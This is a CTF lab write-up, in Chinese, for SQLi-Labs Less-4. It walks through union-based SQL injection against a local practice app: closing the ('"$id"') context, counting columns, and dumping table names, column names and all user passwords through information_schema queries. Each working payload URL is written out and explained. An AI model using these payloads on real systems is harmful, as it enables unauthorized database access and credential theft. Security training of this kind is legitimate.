【SQLi-Labs】Less-4 双引号与括号闭合联合查询注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.22 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, MySQL

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-4 (GET - Error based - Double Quotes - String)
  • 提示：GET请求，基于报错，字符型注入（双引号与括号混合）

2. 解题思路与前置原理

本关卡的核心考点是“上下文逃逸（Context Breakout）”中的双引号变种。根据关卡名称（Double Quotes）与常规后端代码写法推断，参数被包裹在双引号和括号中。在注入时，需要使用双引号和右括号 ") 来破坏并重组原有的语法结构，随后使用注释符消除尾部多余代码，最终通过 UNION 联合查询提取数据。

3. 操作步骤与解析

第一步：探测注入点与报错分析

输入 URL：http://localhost/sqli-labs-master/Less-4/?id=1"

回显现象：页面抛出 SQL 语法错误：You have an error in your SQL syntax... near '"1"") LIMIT 0,1' at line 1。

解释与原理：观察报错信息中的 near '"1"")。这说明我们输入的双引号闭合了原字符串，但导致了后续语法崩溃。推断后台 SQL 语句为 SELECT * FROM users WHERE id = ("$id") LIMIT 0,1。我们需要同时补齐双引号和右括号。

第二步：构造闭合与确定字段数

输入 URL：http://localhost/sqli-labs-master/Less-4/?id=1") --+

回显现象：页面恢复正常，成功回显 Dumb/Dumb。

解释与原理：输入 1") 时，拼装后的语句变为 id = ("1")，双引号和括号均完美闭合。加上 --+ 注释掉后方的 ") LIMIT 0,1，保证注入语句完整执行。

验证列数：

输入 URL：http://localhost/sqli-labs-master/Less-4/?id=1") ORDER BY 3 --+ （页面正常）

输入 URL：http://localhost/sqli-labs-master/Less-4/?id=1") ORDER BY 4 --+ （报错：Unknown column '4' in 'order clause'）

确认字段数为 3 个。

第三步：探测回显点

输入 URL：http://localhost/sqli-labs-master/Less-4/?id=-1") UNION SELECT 1,2,3 --+

回显现象：页面回显数字 2 和 3。

解释与原理：使用 -1 占位，使前置查询为空。确认第 2 列和第 3 列的数据会被前端页面渲染，作为后续数据输出的位置。

第四步：获取表名

输入 URL：http://localhost/sqli-labs-master/Less-4/?id=-1") UNION SELECT 1,2, group_concat(table_name) FROM information_schema.tables WHERE table_schema='security' --+

回显现象：回显点 3 输出 emails,referrers,uagents,users。

解释与原理：利用联合查询访问系统元数据表，提取当前库的表名。group_concat() 函数将多行结果合并输出。

第五步：获取列名

输入 URL：http://localhost/sqli-labs-master/Less-4/?id=-1") UNION SELECT 1,2, group_concat(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users' --+

回显现象：回显点 3 输出 id,username,password。

解释与原理：查询列名信息，限定 table_schema 和 table_name 以排除系统表的干扰。

第六步：提取最终数据

输入 URL：http://localhost/sqli-labs-master/Less-4/?id=-1") UNION SELECT 1, group_concat(username), group_concat(password) FROM security.users --+

回显现象：页面输出 security 库 users 表下的所有账号及明文密码。

4. 踩坑记录与复盘

  • 闭合符的精准匹配：报错信息中的 near '"1"") 是解题的关键。遇到报错必须仔细观察包裹输入值的符号（单/双引号、括号），不可盲目套用前几关的 Payload。
  • 数据污染与命名空间：在查询 information_schema.columns 时，如果只限制 table_name='users'，会将 MySQL 系统库中的同名表列名一并查出。最佳实践是加上 table_schema='security' 进行精准过滤。

5. 知识点总结与工具说明

  • 混合闭合：Less-4 的后端结构为 ("$id")，这要求注入者在构造 Payload 时同时考虑双引号和括号的闭合顺序。
  • 工具环境：当前阶段采用纯手工注入，仅依赖浏览器及本地靶场环境。后续涉及自动化脚本或工具的下载与使用，将在对应关卡补充详细的配置步骤与代码解析。
